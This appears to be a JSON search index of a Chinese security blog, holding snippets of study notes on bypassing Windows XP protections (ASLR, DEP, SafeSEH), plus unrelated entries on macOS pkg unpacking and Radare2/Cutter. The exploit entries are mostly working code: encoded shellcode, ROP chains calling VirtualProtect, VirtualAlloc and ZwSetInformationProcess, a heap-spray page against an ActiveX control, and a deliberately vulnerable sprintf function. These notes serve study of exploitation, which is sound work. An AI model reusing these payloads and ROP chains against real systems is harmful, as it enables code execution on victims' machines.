很可惜，没有找到合适的修复eax的指令，换地址 0x303911D3也是JMP ESP，但它组成的汇编代码将会同时读取EC和EAX的内容，因此这两个寄存器都需要修复，不可行，换指令 JMP ESP没有，改用JMP ESI，地址0x3000DCD2中包含0，直接排除，地址0x302420C3最后一个字节是retn，无法使用，排除，地址0x3028EE6E汇编代码将直接引起异常，排除，此指令也没有合适的了，因此寻找其它合适指令 位于地址0x300942F2的CALL ESP貌似正合适，它也会将esp增加8个字节正好避开了垃圾数据 以下是改变以后的shellcode&amp;lt;object classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0&quot; width=&quot;160&quot; height=&quot;260&quot;&amp;gt;&amp;lt;param name=&quot;movie&quot; value=&quot;1.swf&quot; /&amp;gt;&amp;lt;param name=&quot;quality&quot; value=&quot;high&quot; /&amp;gt;&amp;lt;embed src=&quot;1.swf&quot; quality=&quot;high&quot; pluginspage=&quot;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;160&quot; height=&quot;260&quot;&amp;gt;&amp;lt;/embed&amp;gt;&amp;lt;/object&amp;gt;&amp;lt;object classid=&quot;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&quot; id=&quot;test&quot;&amp;gt;&amp;lt;/object&amp;gt;&amp;lt;script&amp;gt; var s = &quot;\\u9090&quot;; while (s.length &amp;lt; 54) { s += &quot;\\u9090&quot;; } s += &quot;\\u42F2\\u3009&quot;; s += &quot;\\u9090\\u9090&quot;; s += &quot;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857&quot;; test.test(s);&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; 如图，重启系统，shellcode运行正常，这意味着攻击ASLR成功" }, { "title": "macOS-pkg文件解析", "url": "/posts/macOS-pkg%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/", "categories": "Other", "tags": "macOS, Other", "date": "2020-11-24 12:56:00 +0800", "snippet": "macOS-pkg文件解析&amp;amp;PD16无法联网解决办法&amp;amp;ls的@符号问题本文来源：Moeomu的博客起因ed2k链接没法用motrix下载，准备去下载一个迅雷的精简版，突然发现找出来的是pkg安装包，引起了我的兴趣经过解包 一直以来都很奇怪pkg究竟运行了哪些东西，又干了什么，因此开始第一步，解包 解包只需要一条命令即可：pkgutil --expand 需要解包的pkg.pkg 自定义解包文件夹名查看 发现有个Res文件，没有后缀，用file查看一下格式发现它被压缩了，索性unar指令解压，出来一个同名文件，但是大小变大了 在finder中右键-打开方式-归档实用工具-app被直接解压出来 将此app拖入/Application中，发现可以直接使用，就此完成任务 看了看其它文件，有个用于打开网页的Unix可执行文件，大概就是推广，没有流氓行为结果 完成任务追加iOS app 安装器的探索 更新了BigSur系统后，发现系统中存在iOS app 安装器这么个东西，但是无法运行，遂探索了一番 查看此软件位置，顺便看看种类，很好，通用，意味着可能以后会支持Intel？ 打开Terminal，进入此文件夹，运行软件，报错，提示需要依赖文件，如图 找到依赖文件所在位置，发现貌似没有东西，原因可能是仅提供ARM版本的依赖程序Parallels Desktop 无法联网解决办法 依旧是BigSur的问题，PD16又不能联网了，无奈找了个折中的解决办法 运行命令sudo -b /Applications/Parallels\\ Desktop.app/Contents/MacOS/prl_client_app后将会打开PD16，这样就能联网了 这条命令的意思是将此程序以管理员权限运行，但是其实应该是BigSur再次收紧了权限，导致PD16破解出问题 可以将这条命令写入.command文件中放在桌面，这样双击打开也可ls -l的@符号问题 最近发现有的文件夹/文件会出现@符号的标识，有些奇怪这是什么意思，就简单探究了一下 由于此现象是ls程序出现的，因此问问系统的说明文档，命令man ls 很快啊，啪的一下就出来了，如图-@ Display extended attribute keys and sizes in long (-l) output.-@ 在long(-l)输出中显示扩展的属性键和大小。 非常明了了，就是指的是这种文件/文件夹存在扩展属性，而此属性可以使用xattr -l命令查看 这种属性也可以使用xattr -c完全清理掉" }, { "title": "逆向工具-Radare2和Cutter", "url": "/posts/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Radare2%E5%92%8CCutter/", "categories": "Reverse", "tags": "Reverse, Tools", "date": "2020-11-21 19:04:00 +0800", "snippet": "开源逆向神器-Radare2和Cutter本文来源：Moeomu的博客介绍Radare2 r2 is a rewrite from scratch of radare in order to provide a set of libraries and tools to work with binary files. Radare project started as a forensics tool, a scriptable command-line hexadecimal editor able to open disk files, but later added support for analyzing binaries, disassembling code, debugging programs, attaching to remote gdb servers… radare2 is portable. To learn more you may read the official radare2 book, the source code, or browse the web for blog posts or presentations from r2con. Cutter Cutter is a free and open-source reverse engineering framework powered by radare2 . Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineers.安装 由于Cutter是Radare2的GUI化程序，因此只需要下载Cutter即可 本次测试系统：macOS Catalina 10.15.7 Github下载链接：github.com/radareorg/cutter/releases Moeomu网盘下载链接(可能不是最新)：Cutter-v1.12.0-x64.dmgmacOS Catalina无法运行Cutter的原因 不知道Windows怎么样，反正在macOS Catalina上安装后无法正常运行，解决方法如下 找出无法正常运行的原因 进入Cutter的文件夹：cd /Applications/Cutter.app/Contents/MacOS/ 直接运行Cutter查看原因：./Cutter 安装gettext解决问题：brew install gettext" }, { "title": "漏洞学习笔记-016-利用可执行内存和.NET攻击DEP", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-016-%E5%88%A9%E7%94%A8%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E5%92%8C.NET%E6%94%BB%E5%87%BBDEP/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-20 14:13:00 +0800", "snippet": "Ret2Libc之利用VirtualProtect和VirtualAlloc攻击DEP攻击DEP本文来源：Moeomu的博客利用可执行内存攻击DEP原理 有的时候在进程的内存空间中会存在一段可读可写可执行的内存，如果我们能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会代码#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;windows.h&amp;gt;char shellcode[] =&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;......&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn&quot;\\x0B\\x1A\\xBF\\x7C&quot;//pop pop retn&quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正EBP retn 4&quot;\\x5F\\x78\\xA6\\x7C&quot;//pop retn&quot;\\x08\\x00\\x14\\x00&quot;//可执行内存中弹出对话框机器码的起始地址&quot;\\x00\\x00\\x14\\x00&quot;//可执行内存空间地址，复制用&quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &amp;amp;&amp;amp; 原始 shellcode 起始地址&quot;\\xFF\\x00\\x00\\x00&quot;//shellcode 长度&quot;\\xAC\\xAF\\x94\\x7C&quot;//memcpy&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;......&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;void test(){ char tt[176]; memcpy(tt, shellcode, 450);}int main(){ HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;}后记 按理来说是要有RWE权限的内存区域的，可惜么得，此实验未完成利用.NET攻击DEP原理 .NET 的文件具有和与PE文件一样的结构，也就是说它也具有.text等段，这些段也会被映射到内存中，也会具备一定的可执行属性。大家应该想到如何利用这一点了，将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了 需求 具有溢出漏洞的ActiveX控件 包含有shellcode的.NET控件 可以触发ActiveX控件中溢出漏洞的POC页面 代码 具有溢出漏洞的ActiveX控件void CVulnerAXCtrl::test(LPCTSTR str){ // AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: Add your dispatch handler code here printf(&quot;aaaa&quot;); // 定位该函数的标记 char dest[100]; sprintf(dest, &quot;%s&quot;, str);} 包含有shellcode的.NET控件using System;using System.Collections.Generic;using System.Linq;using System.Text;namespace DEP_NETDLL{ public class Class1 { public void Shellcode() { string shellcode = &quot;\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090&quot; + &quot;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91&quot; + &quot;\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332&quot; + &quot;\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c&quot; + &quot;\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505&quot; + &quot;\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b&quot; + &quot;\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06&quot; + &quot;\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c&quot; + &quot;\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd&quot; + &quot;\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33&quot; + &quot;\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050&quot; + &quot;\\uff53\\ufc57\\uff53\\uf857&quot; ; } }}利用Java Applet挑战DEP 难以找到适合的版本，所以此实验略过，以后有机会再补充" }, { "title": "漏洞学习笔记-015-利用VirtualProtect和VirtualAlloc攻击DEP", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-015-%E5%88%A9%E7%94%A8VirtualProtect%E5%92%8CVirtualAlloc%E6%94%BB%E5%87%BBDEP/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-19 17:43:00 +0800", "snippet": "Ret2Libc之利用VirtualProtect和VirtualAlloc攻击DEP攻击DEP本文来源：Moeomu的博客利用VirtualProtect攻击DEP原理 利用VirtualProtect函数将栈页内存属性改为可执行前置内容 VirtualProtect参数BOOL VirtualProtect( LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);// 所以可以这样写BOOL VirtualProtect( shellcode 所在内存空间起始地址, shellcode 大小, 0x40, 某个可写地址); 这里势必存在0，因此攻击函数换为memcpy步骤 修复EBP，这样调用函数的时候不会内存读取违规而异常 填入VirtualProtect的地址，将会返回于此 填入空的指令 填入返回地址 填入函数的参数 填入shellcode本身代码 模拟环境：系统：Windows XP SP3，DEP：Optout，编译器：VC6，编译选项：禁用优化，版本：release#include&amp;lt;windows.h&amp;gt;char shellcode[] =&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x85\\x8B\\x1D\\x5D&quot; // push esp pop ebp ret `fix ebp`&quot;\\xD4\\x1A\\x80\\x7C&quot; // VirtualProtect Address&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x8C\\xFE\\x12\\x00&quot; // ret Address&quot;\\xB0\\xFD\\x12\\x00&quot; // Param Address: 0x0012FDB0&quot;\\xFF\\x00\\x00\\x00&quot; // Param Size: 0x100&quot;\\x40\\x00\\x00\\x00&quot; // Param NewProtect: 0x40&quot;\\x00\\x00\\x3F\\x00&quot; // Param pOldProtect: 0x00910000&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; // payload&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;;void test(){ char str[176]; memcpy(str, shellcode, 420);}int main(){ HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;}利用VirtualAlloc攻击DEP前置内容 VirtualAlloc参数LPVOID WINAPI VirtualAlloc( __in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect) 参数说明 lpAddress，申请内存区域的地址，如果这个参数是NULL，系统将会决定分配内存区域的位置，并且按64KB向上取整 dwSize，申请内存区域的大小 flAllocationType，申请内存的类型 flProtect，申请内存的访问控制类型，如读、写、执行等权限。内存申请成功时函数返回申请内存的起始地址，申请失败时返回NULL 代码 模拟环境：系统：Windows XP SP3，DEP：Optout，编译器：VC6，编译选项：禁用优化，版本：release#include &amp;lt;windows.h&amp;gt;char shellcode[] =&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x85\\x8B\\x1D\\x5D&quot; // push esp pop ebp ret 4&quot;\\xE1\\x9A\\x80\\x7C&quot; // Address of VirtualAlloc&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x70\\x6F\\xC1\\x77&quot; // VirtualAlloc ret address&quot;\\x00\\x00\\x03\\x00&quot; // Param: lpAddress&quot;\\xFF\\x00\\x00\\x00&quot; // Param: dwSize&quot;\\x00\\x10\\x00\\x00&quot; // Param: flAllocationType&quot;\\x40\\x00\\x00\\x00&quot; // Param: flProtect&quot;\\x00\\x00\\x03\\x00&quot; // memcpy ret address&quot;\\x00\\x00\\x03\\x00&quot; // Param: destin&quot;\\x94\\xFE\\x13\\x00&quot; // Param: source&quot;\\xFF\\x00\\x00\\x00&quot; // Param: n&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; // payload&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;;void test(){ char tt[176]; memcpy(tt, shellcode, 450);}int main(){ HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;}技术细节 首先使用VirtualAlloc申请一段空间用于执行shellcode 随后使用memcpy将shellcode复制过去 最后在memcpy返回时直接返回到shellcode payload的起始地址" }, { "title": "漏洞学习笔记-014-DEP的介绍", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-014-DEP%E7%9A%84%E4%BB%8B%E7%BB%8D/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-19 12:42:00 +0800", "snippet": "Windows的DEP保护和简单的攻击方法本文来源：Moeomu的博客DEP的介绍 溢出攻击的根源是未准确区分数据和代码，但是重新设计计算机结构是不太可能的事情，所以使用各种办法去减缓溢出攻击原理 将数据所在的内存页标为不可执行，而程序成功溢出进入shellcode时，CPU将会抛出执行异常 DEP分为软件DEP和硬件DEP，而软件DEP指的是SafeSEH，硬件DEP在AMD平台上称为No-Execute Page-Protection(NX)，Intel平台上称为Execute Disable Bit(XD) 操作系统通过设置内存页的NX和XD标记，来指明不能从此执行代码，PageTable中插入一个标记来标识此页是否运行执行指令，0表示允许，1表示不允许DEP的工作状态 Optin：允许系统组件和服务使用DEP，其它程序将不予保护，而用户可以通过ACT工具标记程序使用DEP，这种保护可以被程序动态关闭，多用于普通用户操作系统 Output：为排除列表外的程序启用DEP，多用于服务器操作系统 AlwaysOn：对所有的程序应用DEP保护，不可被关闭，只有64位操作系统才使用此模式 AlwaysOff：一般不用编译选项 /NXCOMPAT编译选项将在PE头中设置IMAGE_DLLCHARACTERISTICS_ NX_COMPAT标识，位于IMAGE_OPTIONAL_HEADER中的DllCharacteristics，此值为0x100时表示启用DEP利用Ret2Libc挑战DEP原理 DEP保护时溢出失败的原因是DEP检测到代码在非可执行页上执行，如果让程序直接跳转到一个已存在的系统函数中，必然不会被拦截 Ret2Libc是Return-to-libc的简写，如果将每条exploit都找到一条在系统lib中的替代品，那么此exp一定可以正确执行，但问题在于不是每条指令都不包含0，不断的跳转容易跳错地方 以下是三个可行的方法 跳转到ZwSetinfomationProcess函数将DEP关闭，转入shellcode执行 跳转到VirtualProtect将shellcode页面设为可执行，随后转入shellcode执行 跳转到VirtualAlloc申请一段可执行的内存空间随后跳入shellcode执行 尝试ZwSetinfomationProcess关闭DEP前置内容 一个进程的DEP标识存在于KPROCESS结构的_KEXECUTE_OPTION上，可以通过API函数修改 _KEXECUTE_OPTION结构Pos0ExecuteDisable:1bitPos1ExecuteEnable:1bitPos2DisableThunkEmulation:1bitPos3Permanent:1bitPos4ExecuteDispatchEnable:1bitPos5ImageDispatchEnable:1bitPos6Spare:2bit 当前进程DEP开启的时候，ExecuteDisable将会被设置为1 当前进程DEP关闭的时候，ExecuteEnable将会被设置为1 DisableThunkEmulation为了兼容ATL被设置 Permanent被置1后表示这些标志都不能再被修改 我们只要将_KEXECUTE_OPTIONS的值设置为0x02(00000010)就可以将ExecuteEnable置为1shellcode原理 LdrpCheckNXCompatibility函数为了检查DEP兼容性，满足以下条件之一将可以关闭DEP DLL受SafeDisc版权保护系统保护 DLL中含有.aspack，.pcle，.sforce等字节的时候 DLL存在于注册表声明的不需启用DEP的模块的时候HKEY_LOCAL_MACHINE\\SOFTWARE \\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions 代码 测试环境：系统：Windows XP SP3，DEP状态：Optout，编译器：VC6，编译选项：禁用优化，版本：releaseULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;ZwSetInformationProcess( NtCurrentProcess(), // Handle(-1) ProcessExecuteFlags, //0x22 &amp;amp;ExecuteFlags, // ptr to 0x2 sizeof(ExecuteFlags) //0x4);#include &amp;lt;string.h&amp;gt;#include &amp;lt;windows.h&amp;gt;char shellcode[] =&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x52\\xE2\\x92\\x7C&quot; // mov eax, 1&quot;\\x96\\x73\\x1B\\x5D&quot; // mov ebp, esp &amp;amp; esp+8&quot;\\x1E\\xAD\\x17\\x5D&quot; // esp+0x24&quot;\\xB4\\xC1\\xC5\\x7D&quot; // jmp esp&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\x24\\xCD\\x93\\x7C&quot; // call Close DEP&quot;\\x90\\x90\\xE9\\x2D&quot; // jmp to shellcode start&quot;\\xFF\\xFF\\xFF\\x90&quot;;void test(){ char tt[176]; strcpy(tt,shellcode);}int main(){ HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;}技术细节 需要对比al是否为1，所以第一步retn将会返回到mov eax, 1，retn的地址，此地址将会返回到修缮ebp的位置 因为在调用函数之前，会访问ebp中的值，但是它已经被刷写掉了，所以将修缮ebp，在此使用了push esp，pop ebp，retn三条指令将esp中的地址赋值给ebp，由于retn后面跟着数字，因此ebp将会加上这个数字，也就是ebp+8，此时ebp小于esp了，一旦调用子程序将会对栈区进行破坏，所以依旧得将ebp再加上一些，我在此选择将esp加上0x24，与之前的0x8凑成了0x30的栈空间，这样在返回的时候将会返回到语句retn 0x24 retn 0x24语句在返回的时候将会返回到调用关闭DEP的函数ZwSetInformationProcess的地方，调用完毕后将会使用leave语句并retn，因此它将会返回到jmp esp的地址处 由jmp esp跳转到\\x24\\xCD\\x93\\x7C数据存放的地址处，而此垃圾数据将不会影响shellcode的执行 在垃圾数据的后方写入一个跳转即可，至此跳到shellcode真实执行之处" }, { "title": "漏洞学习笔记-013-SafeSEH简介和简单攻击", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-013-SafeSEH%E7%AE%80%E4%BB%8B%E5%92%8C%E7%AE%80%E5%8D%95%E6%94%BB%E5%87%BB/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-12 09:40:00 +0800", "snippet": "SafeSEH简介和简单攻击本文来源：Moeomu的博客SafeSEH简介工作 检查异常处理链是否位于当前程序的栈中。如果不在当前栈中，程序将终止异常处理函数的调用。 检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用。 在前面两项检查都通过后，程序调用一个全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行验证，此函数的工作如下 判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识。如果设置了这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。 检测程序是否包含安全S.E.H表。如果程序包含安全S.E.H表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。 判断程序是否设置ILonly标识。如果设置了这个标识，说明该程序只包含.NET编译中间语言，函数直接返回校验失败。 判断异常处理函数地址是否位于不可执行页(non-executable 